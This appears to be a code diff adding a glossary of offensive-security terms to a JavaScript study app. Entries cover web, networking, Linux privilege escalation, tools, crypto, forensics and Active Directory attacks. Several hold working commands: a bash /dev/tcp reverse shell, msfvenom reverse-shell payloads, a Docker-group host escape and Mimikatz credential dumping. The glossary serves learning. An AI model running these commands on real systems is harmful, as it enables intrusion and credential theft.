+    {id:20,term:'Subdomain Takeover',def:'Claiming a dangling DNS subdomain pointing to an unclaimed service (expired S3 bucket, Heroku app, etc.).',cat:'web'},
+    {id:21,term:'Business Logic Flaw',def:'Vulnerability in application business rules: skip payment, buy negative quantities, bypass multi-step processes.',cat:'web'},
+    {id:22,term:'Broken Authentication',def:'Flaws in login, session management, or credential handling. Includes weak passwords, missing lockout, session fixation.',cat:'web'},
+    {id:23,term:'LFI (Local File Inclusion)',def:'Including local files via vulnerable path parameters. Can read /etc/passwd or achieve RCE with log poisoning.',cat:'web'},
+    {id:24,term:'RFI (Remote File Inclusion)',def:'Including remote files from attacker-controlled server. Requires allow_url_include=On in PHP. Can lead to RCE.',cat:'web'},
+    {id:25,term:'OAuth Misconfiguration',def:'Flaws in OAuth flows: redirect_uri bypass, state parameter missing (CSRF), token leakage in referrer headers.',cat:'web'},
+    {id:26,term:'Prototype Pollution',def:'JavaScript attack that modifies Object.prototype, affecting all objects. Can lead to XSS or RCE in Node.js.',cat:'web'},
+    {id:27,term:'Host Header Injection',def:'Manipulating the Host header to trigger password reset to attacker domain or perform SSRF attacks.',cat:'web'},
+    {id:28,term:'Web Cache Poisoning',def:'Manipulating cache keys to serve malicious content to other users. Requires understanding how caching works.',cat:'web'},
+    {id:29,term:'GraphQL Injection',def:'Attacking GraphQL APIs: introspection abuse, field suggestions, batching attacks, injection via variables.',cat:'web'},
+    {id:30,term:'Parameter Pollution',def:'Sending duplicate parameters to confuse application logic. e.g. ?user=admin&user=guest may lead to unexpected behavior.',cat:'web'},
+    {id:101,term:'TCP/IP',def:'Foundational protocol suite. TCP = reliable connection-oriented (3-way handshake: SYN, SYN-ACK, ACK). IP = addressing and routing.',cat:'networking'},
+    {id:102,term:'DNS',def:'Domain Name System - translates domains to IPs. Port 53. Attacks: spoofing, zone transfer (axfr), subdomain enumeration.',cat:'networking'},
+    {id:103,term:'ARP',def:'Address Resolution Protocol - maps IP to MAC on local network. ARP spoofing enables MITM by sending fake ARP replies.',cat:'networking'},
+    {id:104,term:'OSI Model',def:'7 layers: Physical, Data Link, Network, Transport, Session, Presentation, Application. Remember: Please Do Not Throw Sausage Pizza Away.',cat:'networking'},
+    {id:105,term:'Subnetting',def:'Dividing network into subnetworks using subnet masks. /24 = 255.255.255.0 = 256 hosts. Key for network recon.',cat:'networking'},
+    {id:106,term:'MITM Attack',def:'Man-in-the-Middle - attacker intercepts communication. Methods: ARP spoofing, DNS poisoning, SSL stripping, rogue AP.',cat:'networking'},
+    {id:107,term:'Common Ports',def:'Key ports: 21 FTP, 22 SSH, 23 Telnet, 25 SMTP, 53 DNS, 80 HTTP, 443 HTTPS, 445 SMB, 3306 MySQL, 3389 RDP.',cat:'networking'},
+    {id:108,term:'Firewall',def:'Filters network traffic by rules. Stateful (tracks connections) vs stateless (checks each packet). Layer 3/4 vs Layer 7.',cat:'networking'},
+    {id:109,term:'VPN',def:'Virtual Private Network - encrypts traffic and tunnels through a server. Protocols: OpenVPN, WireGuard, IPSec.',cat:'networking'},
+    {id:110,term:'SMB',def:'Server Message Block - Windows file sharing. Port 445. Vulnerabilities: EternalBlue (MS17-010), Pass-the-Hash attacks.',cat:'networking'},
+    {id:111,term:'DNS Zone Transfer',def:'Replicates entire DNS database. Misconfigured servers allow unauthorized transfers: dig axfr @nameserver domain.com.',cat:'networking'},
+    {id:112,term:'SSL/TLS',def:'Encryption protocols for secure communication. SSL is deprecated; use TLS 1.2+. Attacks: BEAST, POODLE, Heartbleed.',cat:'networking'},
+    {id:113,term:'Wireshark Filters',def:'Common filters: http, tcp.port==80, ip.addr==x.x.x.x, http.request, frame contains "password". Essential for analysis.',cat:'networking'},
+    {id:114,term:'SNMP',def:'Simple Network Management Protocol - manages network devices. Port 161. v1/v2 use community strings (often "public") which are exploitable.',cat:'networking'},
+    {id:115,term:'DoS / DDoS',def:'Denial of Service - overwhelm target with traffic. Distributed DoS uses botnet. Types: SYN flood, UDP flood, HTTP flood.',cat:'networking'},
+    {id:201,term:'chmod',def:'Change file permissions. chmod 777 (rwx all), chmod 644 (owner rw, others r), chmod +x (add execute). Key for privesc.',cat:'linux'},
+    {id:202,term:'SUID Bit',def:'Set User ID - file runs with owner privileges. Find SUID: find / -perm -4000 2>/dev/null. Classic privesc vector.',cat:'linux'},
+    {id:203,term:'sudo -l',def:'List commands current user can run as sudo. If misconfigured (ALL, NOPASSWD), abuse for privilege escalation.',cat:'linux'},
+    {id:204,term:'cron jobs',def:'Scheduled tasks. Check /etc/crontab and /var/spool/cron. Writable cron scripts owned by root = easy privesc.',cat:'linux'},
+    {id:205,term:'grep',def:'Search text patterns. grep -r "password" /etc/ (recursive), -i (case insensitive), -v (invert), -l (filenames only).',cat:'linux'},
+    {id:206,term:'/etc/passwd',def:'Stores user account info: username:x:UID:GID:info:home:shell. x means password is in /etc/shadow.',cat:'linux'},
+    {id:207,term:'/etc/shadow',def:'Stores hashed passwords. Only root-readable. If readable, extract and crack with hashcat or john the ripper.',cat:'linux'},
+    {id:208,term:'netstat / ss',def:'Show network connections. ss -tulnp shows all TCP/UDP ports with PIDs. Essential for post-exploitation recon.',cat:'linux'},
+    {id:209,term:'find command',def:'Search files: find / -name "*.conf" -perm -4000 -user root -writable 2>/dev/null. Powerful for recon and privesc.',cat:'linux'},
+    {id:210,term:'Bash Scripting',def:'#!/bin/bash shebang. Variables: $var. Loops: for i in $(seq 1 10); do echo $i; done. Functions, conditions, pipes.',cat:'linux'},
+    {id:211,term:'awk',def:'Text processing tool. Example: awk -F: "{print $1}" /etc/passwd prints usernames. Powerful for parsing output.',cat:'linux'},
+    {id:212,term:'curl',def:'Transfer data with URLs. curl -X POST -d "data" URL. -H for headers, -b for cookies, -L follows redirects.',cat:'linux'},
+    {id:213,term:'base64',def:'Encode/decode: echo "text" | base64, echo "b64string" | base64 -d. Used heavily in CTFs and payload encoding.',cat:'linux'},
+    {id:214,term:'PATH Hijacking',def:'If SUID binary calls command without full path, create malicious version earlier in PATH. Classic privesc technique.',cat:'linux'},
+    {id:215,term:'LD_PRELOAD',def:'Environment variable to load shared library before others. If sudo preserves it, can escalate privileges with malicious library.',cat:'linux'},
+    {id:216,term:'Capabilities',def:'Fine-grained privileges for processes. getcap -r / 2>/dev/null finds binaries with capabilities. cap_setuid is dangerous.',cat:'linux'},
+    {id:217,term:'tmux',def:'Terminal multiplexer - split terminal, keep sessions alive. Ctrl+b is prefix. Essential for long running sessions.',cat:'linux'},
+    {id:218,term:'strings',def:'Extract printable strings from binary files. strings binary | grep -i pass. Essential for malware analysis and CTFs.',cat:'linux'},
+    {id:219,term:'file command',def:'Determine file type regardless of extension. Reveals if binary is ELF, PNG, ZIP, etc. Common in CTF challenges.',cat:'linux'},
+    {id:220,term:'Docker Escape',def:'If user is in docker group: docker run -v /:/mnt --rm -it alpine chroot /mnt sh gives root access to host.',cat:'linux'},
+    {id:301,term:'Burp Suite',def:'Industry standard web proxy. Proxy intercepts, Repeater re-sends, Intruder fuzzes, Scanner finds vulns, Decoder transforms.',cat:'tools'},
+    {id:302,term:'Nmap',def:'Network scanner. -sV (versions), -sC (scripts), -A (aggressive), -p- (all ports), -O (OS detect), --script=vuln.',cat:'tools'},
+    {id:303,term:'Metasploit',def:'Exploitation framework. msfconsole, search, use, show options, set RHOSTS, run. msfvenom for payload generation.',cat:'tools'},
+    {id:304,term:'Gobuster',def:'Directory/file brute-forcer. gobuster dir -u URL -w /usr/share/wordlists/dirbuster/medium.txt -x php,html,txt.',cat:'tools'},
+    {id:305,term:'sqlmap',def:'Automated SQLi tool. sqlmap -u "URL?id=1" --dbs (databases) --tables -D db --dump. --level and --risk for coverage.',cat:'tools'},
+    {id:306,term:'Hydra',def:'Network login brute-forcer. hydra -l user -P wordlist ssh://IP. hydra -l admin -P list http-post-form "/login:...".',cat:'tools'},
+    {id:307,term:'John the Ripper',def:'Password cracker. john hash.txt --wordlist=rockyou.txt. --format= to specify hash type. --show to display cracked.',cat:'tools'},
+    {id:308,term:'Hashcat',def:'GPU-based password cracker. hashcat -m 0 hash.txt rockyou.txt (MD5). -m 1000 for NTLM, -m 1800 for sha512crypt.',cat:'tools'},
+    {id:309,term:'Netcat (nc)',def:'Swiss army knife. nc -lvnp 4444 (listener). nc IP PORT (connect). Used for shells, file transfer, port scanning.',cat:'tools'},
+    {id:310,term:'Enum4linux',def:'Enumerate Windows/Samba. enum4linux -a IP dumps users, shares, groups, password policies. Key for SMB recon.',cat:'tools'},
+    {id:311,term:'ffuf',def:'Fast web fuzzer. ffuf -u URL/FUZZ -w wordlist. -fc to filter status codes, -fs to filter by size. Faster than gobuster.',cat:'tools'},
+    {id:312,term:'Nikto',def:'Web server scanner. nikto -h URL. Finds outdated software, dangerous files, misconfigs. Noisy - not for stealth.',cat:'tools'},
+    {id:313,term:'Responder',def:'LLMNR/NBT-NS/mDNS poisoner. Captures NTLMv2 hashes on local network. Ideal for internal network pentests.',cat:'tools'},
+    {id:314,term:'Impacket',def:'Python library for network protocols. Tools: psexec.py, secretsdump.py, smbclient.py. Essential for Windows AD hacking.',cat:'tools'},
+    {id:315,term:'BloodHound',def:'Active Directory attack path visualizer. Maps AD object relationships to find paths to Domain Admin.',cat:'tools'},
+    {id:316,term:'LinPEAS / WinPEAS',def:'Automated privilege escalation enumeration scripts. Run on target for instant list of potential privesc vectors.',cat:'tools'},
+    {id:317,term:'GTFOBins',def:'Website listing Unix binaries exploitable for privilege escalation, file read/write, shells. gtfobins.github.io.',cat:'tools'},
+    {id:318,term:'Shodan',def:'Search engine for internet-connected devices. Find open ports, services, vulnerabilities. Use dorks for specific targets.',cat:'tools'},
+    {id:319,term:'Nuclei',def:'Fast vulnerability scanner using templates. nuclei -u URL -t templates/. Community templates cover thousands of CVEs.',cat:'tools'},
+    {id:320,term:'msfvenom',def:'Payload generator. msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f elf -o shell.',cat:'tools'},
+    {id:321,term:'chisel',def:'TCP/UDP tunneling over HTTP. Used for port forwarding through firewalls. chisel server and chisel client modes.',cat:'tools'},
+    {id:322,term:'proxychains',def:'Route traffic through proxy chains (SOCKS4/5, HTTP). proxychains nmap -sT IP for scanning through a pivot.',cat:'tools'},
+    {id:323,term:'aircrack-ng',def:'Wi-Fi security auditing suite. airodump-ng captures, aireplay-ng de-auths, aircrack-ng cracks WPA2 handshakes.',cat:'tools'},
+    {id:324,term:'Mimikatz',def:'Windows credential extraction tool. sekurlsa::logonpasswords dumps plaintext passwords from memory. Requires admin/SYSTEM.',cat:'tools'},
+    {id:325,term:'Subfinder',def:'Fast subdomain discovery. subfinder -d domain.com -o output.txt. Passive - queries multiple public sources.',cat:'tools'},
+    {id:401,term:'Privilege Escalation',def:'Gaining higher permissions than intended. Linux: SUID, sudo misconfig, writable cron, PATH hijack. Windows: unquoted paths, DLL hijacking.',cat:'general'},
+    {id:402,term:'Reverse Shell',def:'Target connects back to attacker. bash -i >& /dev/tcp/IP/PORT 0>&1. Always set up nc listener first: nc -lvnp PORT.',cat:'general'},
+    {id:403,term:'Bind Shell',def:'Attacker connects to target. Target opens port and listens. Use when inbound connections to attacker are blocked.',cat:'general'},
+    {id:404,term:'Reconnaissance',def:'First phase of pentesting. Passive: OSINT, dorking, Shodan. Active: Nmap, Gobuster, subdomain enum. Never skip recon.',cat:'general'},
+    {id:405,term:'CVE',def:'Common Vulnerabilities and Exposures - unique ID for known vulns. CVE-YEAR-NUMBER. Check NVD or exploit-db for details.',cat:'general'},
+    {id:406,term:'Payload',def:'Code delivered to target to execute an action. Staged (downloads more code) vs stageless (self-contained).',cat:'general'},
+    {id:407,term:'Enumeration',def:'Systematically extracting info: users, shares, services, versions. More enumeration = more attack surface found.',cat:'general'},
+    {id:408,term:'Hash Cracking',def:'Recovering plaintext from hashes. Methods: dictionary (rockyou.txt), brute force, rainbow tables. Tools: hashcat, john.',cat:'general'},
+    {id:409,term:'Google Dorking',def:'Advanced Google operators. site:target.com filetype:pdf, intitle:"index of", inurl:admin, "password" filetype:txt.',cat:'general'},
+    {id:410,term:'Social Engineering',def:'Manipulating people to reveal info or perform actions. Phishing (email), vishing (voice), pretexting (fake scenario).',cat:'general'},
+    {id:411,term:'Bug Bounty',def:'Companies pay researchers to find vulns. Platforms: HackerOne, Bugcrowd, Intigriti. Start with P3/P4 bugs on small programs.',cat:'general'},
+    {id:412,term:'Lateral Movement',def:'Moving from compromised host to other systems in network. Methods: pass-the-hash, pass-the-ticket, RDP, SMB.',cat:'general'},
+    {id:413,term:'Persistence',def:'Maintaining access after initial compromise. Methods: scheduled tasks, registry run keys, backdoors, SSH keys, cron jobs.',cat:'general'},
+    {id:414,term:'Pivoting',def:'Using compromised machine as a relay to attack otherwise unreachable networks. Tools: chisel, socat, SSH tunneling.',cat:'general'},
+    {id:415,term:'OSINT',def:'Open Source Intelligence - gathering info from public sources: LinkedIn, GitHub, WHOIS, Shodan, Google, social media.',cat:'general'},
+    {id:416,term:'Zero Day',def:'Unknown vulnerability with no patch available. Extremely valuable. Contrast with N-day (known but unpatched) vulnerabilities.',cat:'general'},
+    {id:417,term:'Buffer Overflow',def:'Writing more data than a buffer can hold, overwriting adjacent memory. Can overwrite return address to redirect execution.',cat:'general'},
+    {id:418,term:'CTF',def:'Capture The Flag - hacking competitions with challenges. Find flags (strings) by solving security puzzles. Jeopardy vs attack-defense.',cat:'general'},
+    {id:419,term:'Pentest Phases',def:'Recon, Scanning, Exploitation, Post-Exploitation, Reporting. Also mapped to the Cyber Kill Chain.',cat:'general'},
+    {id:420,term:'Red Team',def:'Simulates real attackers to test defenses. Goes beyond pentest - uses advanced TTPs, focuses on objectives not just vulns.',cat:'general'},
+    {id:421,term:'Blue Team',def:'Defenders - monitor, detect, and respond to attacks. Uses SIEM, IDS/IPS, EDR, and incident response procedures.',cat:'general'},
+    {id:422,term:'MITRE ATT&CK',def:'Knowledge base of adversary tactics, techniques, and procedures. Used by both offensive and defensive security teams.',cat:'general'},
+    {id:501,term:'Symmetric Encryption',def:'Same key for encrypt and decrypt. Fast but key distribution is a problem. Examples: AES, DES, 3DES, RC4, ChaCha20.',cat:'crypto'},
+    {id:502,term:'Asymmetric Encryption',def:'Public key encrypts, private key decrypts. Solves key distribution. Slower than symmetric. Examples: RSA, ECC, ElGamal.',cat:'crypto'},
+    {id:503,term:'AES',def:'Advanced Encryption Standard - most widely used symmetric cipher. 128/192/256-bit keys. Modes: CBC, GCM, CTR. Never use ECB.',cat:'crypto'},
+    {id:504,term:'RSA',def:'Asymmetric encryption based on factoring large primes. Key sizes: 2048+ bits recommended. Used for key exchange and signatures.',cat:'crypto'},
+    {id:505,term:'MD5',def:'Message Digest 5 - 128-bit hash. Cryptographically broken due to collision attacks. Never use for passwords or security.',cat:'crypto'},
+    {id:506,term:'SHA family',def:'Secure Hash Algorithm. SHA-1 (broken), SHA-256 (good), SHA-512 (strong). Used for integrity verification and passwords.',cat:'crypto'},
+    {id:507,term:'Hash Function',def:'One-way function: input to fixed-size digest. Same input always gives same output. Cannot be reversed. Used for passwords.',cat:'crypto'},
+    {id:508,term:'Salt',def:'Random value added to password before hashing. Prevents rainbow table attacks. Each user should have unique salt.',cat:'crypto'},
+    {id:509,term:'HMAC',def:'Hash-based Message Authentication Code - combines key with hash for authentication. Used in JWT, API authentication.',cat:'crypto'},
+    {id:510,term:'SSL/TLS Handshake',def:'Client Hello, Server Hello+Certificate, Key Exchange, Finished. Establishes encrypted session with verified identity.',cat:'crypto'},
+    {id:511,term:'CBC Mode',def:'Cipher Block Chaining - each block XORed with previous ciphertext. Requires IV. Vulnerable to padding oracle attacks.',cat:'crypto'},
+    {id:512,term:'Padding Oracle',def:'Attack on CBC that exploits error messages about invalid padding to decrypt ciphertext without the key.',cat:'crypto'},
+    {id:513,term:'Rainbow Table',def:'Precomputed hash to plaintext lookup table. Defeated by salting passwords. Used in offline password cracking.',cat:'crypto'},
+    {id:514,term:'Bcrypt',def:'Password hashing with built-in salt and configurable work factor. Resistant to brute force. Use for password storage.',cat:'crypto'},
+    {id:515,term:'Diffie-Hellman',def:'Key exchange protocol - two parties derive shared secret over insecure channel without transmitting the secret.',cat:'crypto'},
+    {id:516,term:'Base64',def:'Encoding scheme (NOT encryption) using 64 characters. Used to represent binary data as text. Easily decoded by anyone.',cat:'crypto'},
+    {id:517,term:'XOR Cipher',def:'XOR each byte with key byte. XOR with same key twice returns original. Single-byte XOR easily broken with frequency analysis.',cat:'crypto'},
+    {id:518,term:'Caesar Cipher',def:'ROT cipher - shifts each letter by N positions. ROT13 shifts by 13. Easily broken by frequency analysis or brute force.',cat:'crypto'},
+    {id:601,term:'File Carving',def:'Extracting files from raw data by identifying file signatures (magic bytes). Tools: foremost, scalpel. Used in disk forensics.',cat:'forensics'},
+    {id:602,term:'Magic Bytes',def:'File signature - first bytes identifying file type. PNG: 89 50 4E 47, PDF: 25 50 44 46, ZIP: 50 4B 03 04.',cat:'forensics'},
+    {id:603,term:'Steganography',def:'Hiding data inside other files (image, audio, text). Tools: steghide, zsteg, stegsolve, binwalk. Common in CTF forensics.',cat:'forensics'},
+    {id:604,term:'Binwalk',def:'Analyze and extract embedded files from firmware and images. binwalk -e file extracts all embedded content. Key CTF tool.',cat:'forensics'},
+    {id:605,term:'Exiftool',def:'Read/write metadata in files. exiftool image.jpg reveals camera, GPS, timestamps. Metadata can expose sensitive info.',cat:'forensics'},
+    {id:606,term:'Volatility',def:'Memory forensics framework. volatility -f mem.dump --profile=Win7 pslist. Analyze RAM dumps for processes and passwords.',cat:'forensics'},
+    {id:607,term:'Autopsy',def:'Digital forensics GUI platform. Analyzes disk images, recovers deleted files, timeline analysis, keyword search.',cat:'forensics'},
+    {id:608,term:'Hex Editor',def:'View/edit raw bytes of any file. Tools: hexedit (CLI), HxD (Windows). Essential for finding hidden data or fixing files.',cat:'forensics'},
+    {id:609,term:'Steghide',def:'Hide/extract data in images and audio. steghide embed -cf image.jpg -sf secret.txt. steghide extract -sf image.jpg.',cat:'forensics'},
+    {id:610,term:'LSB Steganography',def:'Least Significant Bit - hide data in lowest bits of pixel values. Invisible to naked eye but detectable with tools.',cat:'forensics'},
+    {id:701,term:'Malware',def:'Malicious software. Types: virus (attaches to files), worm (self-replicates), trojan (disguised), ransomware, spyware, rootkit.',cat:'malware'},
+    {id:702,term:'Ransomware',def:'Encrypts victim files and demands payment for decryption key. Notable examples: WannaCry, NotPetya, REvil, LockBit.',cat:'malware'},
+    {id:703,term:'Trojan',def:'Malware disguised as legitimate software. Does not self-replicate. Establishes backdoor for attacker access.',cat:'malware'},
+    {id:704,term:'Rootkit',def:'Malware that hides its presence and other malware from OS and security tools. Operates at kernel level. Very hard to detect.',cat:'malware'},
+    {id:705,term:'Keylogger',def:'Records keystrokes to capture passwords, credit cards, messages. Can be software or hardware based.',cat:'malware'},
+    {id:706,term:'Botnet',def:'Network of infected machines (bots) controlled by attacker (botmaster). Used for DDoS, spam, credential stuffing.',cat:'malware'},
+    {id:707,term:'RAT (Remote Access Trojan)',def:'Provides attacker full remote control of infected machine. Often includes keylogging, screen capture, file access.',cat:'malware'},
+    {id:708,term:'Static Analysis',def:'Analyzing malware without executing it. Tools: strings, file, Ghidra, IDA Pro, pestudio. Safe - no risk of infection.',cat:'malware'},
+    {id:709,term:'Dynamic Analysis',def:'Running malware in controlled environment (sandbox) to observe behavior. Tools: Cuckoo Sandbox, ANY.RUN, Joe Sandbox.',cat:'malware'},
+    {id:710,term:'Obfuscation',def:'Making code harder to analyze. Techniques: encoding, encryption, packing, anti-disassembly tricks. Defeats simple AV.',cat:'malware'},
+    {id:711,term:'Fileless Malware',def:'Malware that operates entirely in memory without writing to disk. Uses PowerShell, WMI, registry. Evades file-based AV.',cat:'malware'},
+    {id:712,term:'Living Off The Land',def:'Using legitimate built-in tools (certutil, PowerShell, wmic) for malicious purposes. Hard to detect - no malware dropped.',cat:'malware'},
+    // ---- ADDITIONAL TERMS (expanding to 1000) ----
+    {id:801,term:'Nmap',def:'Network Mapper - essential port scanner. nmap -sV -sC -p- target. Flags: -sS (stealth), -O (OS detect), -A (aggressive), --script vuln.',cat:'tools'},
+    {id:802,term:'Burp Suite',def:'Web app proxy and testing platform. Intercept/modify requests, Spider, Scanner, Intruder (brute force), Repeater (replay), Decoder.',cat:'tools'},
+    {id:803,term:'Metasploit',def:'Exploitation framework. msfconsole, search/use/set/run workflow. Payloads: meterpreter, shell. msfvenom for standalone payloads.',cat:'tools'},
+    {id:804,term:'Gobuster',def:'Directory and DNS brute forcer. gobuster dir -u http://target -w /wordlist.txt. Also: ffuf, dirbuster, feroxbuster.',cat:'tools'},
+    {id:805,term:'Hydra',def:'Network login brute forcer. hydra -l user -P pass.txt ssh://target. Supports SSH, FTP, HTTP, RDP, SMB, and 50+ protocols.',cat:'tools'},
+    {id:806,term:'Wireshark',def:'GUI packet analyzer. Capture and inspect network traffic. Filters: tcp.port==80, http, dns. tshark for CLI use.',cat:'tools'},
+    {id:807,term:'John the Ripper',def:'Password hash cracker. john hash.txt --wordlist=rockyou.txt. Supports MD5, SHA, NTLM, bcrypt. Also: hashcat (GPU-based).',cat:'tools'},
+    {id:808,term:'Hashcat',def:'GPU-accelerated password cracker. hashcat -m 0 hash.txt wordlist.txt. Attack modes: dictionary, combinator, brute force, rule.',cat:'tools'},
+    {id:809,term:'SQLmap',def:'Automated SQL injection tool. sqlmap -u "http://target/?id=1" --dbs. Flags: --dump, --os-shell, --technique. Use carefully.',cat:'tools'},
+    {id:810,term:'Netcat',def:'The Swiss army knife of networking. nc -lvnp 4444 (listener). nc target 80 (connect). File transfer, port scan, bind/reverse shells.',cat:'tools'},
+    {id:811,term:'Responder',def:'LLMNR/NBT-NS/mDNS poisoner for credential capture on local networks. Captures NTLMv2 hashes for offline cracking.',cat:'tools'},
+    {id:812,term:'BloodHound',def:'Active Directory attack path mapper. Visualizes privilege escalation paths using graph theory. Ingestor: SharpHound.',cat:'tools'},
+    {id:813,term:'Impacket',def:'Python toolkit for Windows protocols. Tools: psexec.py, smbclient.py, secretsdump.py, GetUserSPNs.py, wmiexec.py.',cat:'tools'},
+    {id:814,term:'CrackMapExec',def:'Swiss army knife for pentesting Windows/AD networks. CME smb, winrm, mssql modules. --pass-pol, --sam, --lsa flags.',cat:'tools'},
+    {id:815,term:'Evil-WinRM',def:'WinRM shell for Windows pentesting. evil-winrm -i IP -u user -p pass. Uploads, downloads, PowerShell scripts built-in.',cat:'tools'},
+    {id:816,term:'Ffuf',def:'Fast web fuzzer. ffuf -u http://target/FUZZ -w wordlist. Headers, POST data, subdomains fuzzing. Faster than gobuster.',cat:'tools'},
+    {id:817,term:'Nikto',def:'Web server scanner. nikto -h target. Checks for outdated software, dangerous files, misconfigurations. Noisy - not stealthy.',cat:'tools'},
+    {id:818,term:'OWASP ZAP',def:'Free web app scanner and proxy. Good Burp Suite alternative. Passive and active scanning, fuzzer, spider built-in.',cat:'tools'},
+    {id:819,term:'Dirb',def:'Web content scanner using wordlists. dirb http://target /usr/share/dirb/wordlists/common.txt. Similar to gobuster.',cat:'tools'},
+    {id:820,term:'Enum4linux',def:'SMB enumeration tool for Linux/Samba. Enumerates users, shares, groups, policies. enum4linux -a target.',cat:'tools'},
+    {id:821,term:'Shodan',def:'Search engine for internet-connected devices. Find open ports, services, banners, vulnerabilities by IP/ASN/country/product.',cat:'tools'},
+    {id:822,term:'Maltego',def:'OSINT and link analysis tool. Visualizes relationships between entities: people, orgs, domains, IPs. Community edition is free.',cat:'tools'},
+    {id:823,term:'theHarvester',def:'Email, subdomain, and employee recon tool. Queries Google, Bing, LinkedIn, Shodan. theHarvester -d target.com -b all.',cat:'tools'},
+    {id:824,term:'Recon-ng',def:'Web reconnaissance framework with modules. Similar to Metasploit for OSINT. Modules for domains, contacts, credentials.',cat:'tools'},
+    {id:825,term:'Nuclei',def:'Fast vulnerability scanner using community templates. nuclei -u target -t cves/ -t exposures/. Template-based detection.',cat:'tools'},
+    {id:826,term:'Chisel',def:'TCP tunnel over HTTP for port forwarding through firewalls. Great for pivoting: chisel server on attacker, client on target.',cat:'tools'},
+    {id:827,term:'Ligolo-ng',def:'Advanced tunneling tool for pentesters. Creates a TUN interface for seamless pivoting. Better than chisel for complex networks.',cat:'tools'},
+    {id:828,term:'Pwncat',def:'Reverse/bind shell handler with post-exploitation features. Auto-upgrade shells, file transfer, persistence. Written in Python.',cat:'tools'},
+    {id:829,term:'Rustscan',def:'Ultra-fast port scanner. Scans all 65535 ports in seconds, then pipes to nmap. rustscan -a target -- -sV -sC.',cat:'tools'},
+    {id:830,term:'Amass',def:'In-depth attack surface mapping and asset discovery. Subdomain enumeration via DNS brute-forcing, certificate scraping, APIs.',cat:'tools'},
+    {id:831,term:'Subfinder',def:'Fast passive subdomain enumeration tool. Uses 100+ sources. subfinder -d target.com. Part of ProjectDiscovery suite.',cat:'tools'},
+    {id:832,term:'Httpx',def:'Fast HTTP toolkit to probe hosts. Detects status codes, titles, techs, follow redirects. httpx -l hosts.txt -title -tech-detect.',cat:'tools'},
+    {id:833,term:'Katana',def:'Next-gen web crawler by ProjectDiscovery. Crawls SPAs, JS-rendered content. Better than traditional crawlers for modern apps.',cat:'tools'},
+    {id:834,term:'Feroxbuster',def:'Fast content discovery tool written in Rust. Recursive directory fuzzing. feroxbuster -u http://target -w wordlist.txt.',cat:'tools'},
+    {id:835,term:'WPScan',def:'WordPress vulnerability scanner. wpscan --url target --enumerate u,p,t. Finds vulnerable plugins, themes, users.',cat:'tools'},
+    {id:836,term:'Ghidra',def:'NSA reverse engineering framework (free/open-source). Disassembler and decompiler. Alternative to IDA Pro for binary analysis.',cat:'tools'},
+    {id:837,term:'GDB',def:'GNU Debugger for Linux binaries. Set breakpoints, examine memory, step through execution. pwndbg/peda/gef plugins for exploit dev.',cat:'tools'},
+    {id:838,term:'Strings',def:'Extract printable strings from binary files. strings binary | grep -i flag. Quick first step in CTF binary/forensics analysis.',cat:'tools'},
+    {id:839,term:'Binwalk',def:'Firmware and binary analysis/extraction. binwalk -e firmware.bin extracts embedded files. Finds compressed data, filesystems.',cat:'tools'},
+    {id:840,term:'Volatility',def:'Memory forensics framework. Analyze RAM dumps. volatility -f mem.dmp --profile=Win7SP1 pslist/netscan/hashdump.',cat:'tools'},
+    {id:841,term:'Autopsy',def:'Digital forensics GUI platform. Analyzes disk images, recovers deleted files, extracts artifacts, timeline analysis.',cat:'tools'},
+    {id:842,term:'Aircrack-ng',def:'WiFi security testing suite. Capture handshakes with airodump-ng, crack with aircrack-ng -w wordlist handshake.cap.',cat:'tools'},
+    {id:843,term:'Kismet',def:'Wireless network detector and sniffer. Detects hidden SSIDs, captures packets, maps networks. Passive - very stealthy.',cat:'tools'},
+    {id:844,term:'Mimikatz',def:'Windows credential extraction tool. sekurlsa::logonpasswords, lsadump::sam, kerberos::ptt. The gold standard for AD attacks.',cat:'tools'},
+    {id:845,term:'PowerSploit',def:'PowerShell offensive security toolkit. Invoke-Mimikatz, PowerUp (privesc), PowerView (AD enumeration), Invoke-Shellcode.',cat:'tools'},
+    {id:846,term:'Empire',def:'PowerShell and Python post-exploitation framework. C2 framework with agents, modules, listeners. Now maintained as BC-Security Empire.',cat:'tools'},
+    {id:847,term:'Covenant',def:'.NET-based C2 framework. Grunts (agents) communicate over HTTP/S. Good for red team ops with strong opsec features.',cat:'tools'},
+    {id:848,term:'Havoc',def:'Modern C2 framework with demon agents. Evasion techniques, sleep obfuscation, indirect syscalls. Popular in red team ops.',cat:'tools'},
+    {id:849,term:'MSFvenom',def:'Metasploit payload generator. msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe > shell.exe.',cat:'tools'},
+    {id:850,term:'Proxychains',def:'Force any TCP connection through SOCKS/HTTP proxy. Use with nmap, metasploit, etc through a pivot. proxychains nmap target.',cat:'tools'},
+    {id:901,term:'Pass the Hash',def:'Using captured NTLM hash directly for authentication without knowing plaintext password. Works on older Windows systems.',cat:'general'},
+    {id:902,term:'Pass the Ticket',def:'Stealing Kerberos tickets (TGT/TGS) from memory and using them for authentication. Uses Mimikatz kerberos::ptt.',cat:'general'},
+    {id:903,term:'Golden Ticket',def:'Forging a Kerberos TGT using the KRBTGT hash, giving unlimited domain access. Persistence technique in AD environments.',cat:'general'},
+    {id:904,term:'Silver Ticket',def:'Forged Kerberos service ticket (TGS) using a service account hash. Provides access to specific services without touching DC.',cat:'general'},
+    {id:905,term:'Kerberoasting',def:'Requesting TGS tickets for SPN accounts and cracking them offline. GetUserSPNs.py or Rubeus. Target service accounts.',cat:'general'},
+    {id:906,term:'AS-REP Roasting',def:'Attack against accounts with Kerberos pre-auth disabled. Request AS-REP and crack offline. GetNPUsers.py from Impacket.',cat:'general'},
+    {id:907,term:'DCSync',def:'Simulate Domain Controller replication to dump NTLM hashes from AD. Requires Replicating Directory Changes right.',cat:'general'},
+    {id:908,term:'LSASS Dump',def:'Dumping lsass.exe process memory to extract credentials. Methods: Task Manager, procdump, Mimikatz, comsvcs.dll.',cat:'general'},
+    {id:909,term:'Token Impersonation',def:'Stealing access tokens from privileged processes to escalate privileges. Incognito/Mimikatz token::elevate. Juicy targets: SYSTEM tokens.',cat:'general'},
+    {id:910,term:'Privilege Escalation',def:'Moving from lower to higher privilege: horizontal (user to user) or vertical (user to admin). Key phase in pentesting.',cat:'general'},
+    {id:911,term:'Lateral Movement',def:'Moving through a network after initial compromise. Techniques: PsExec, WMI, WinRM, pass-the-hash, SMB shares.',cat:'general'},
+    {id:912,term:'Persistence',def:'Maintaining access after reboot/logout. Techniques: scheduled tasks, registry run keys, services, DLL hijacking, backdoors.',cat:'general'},
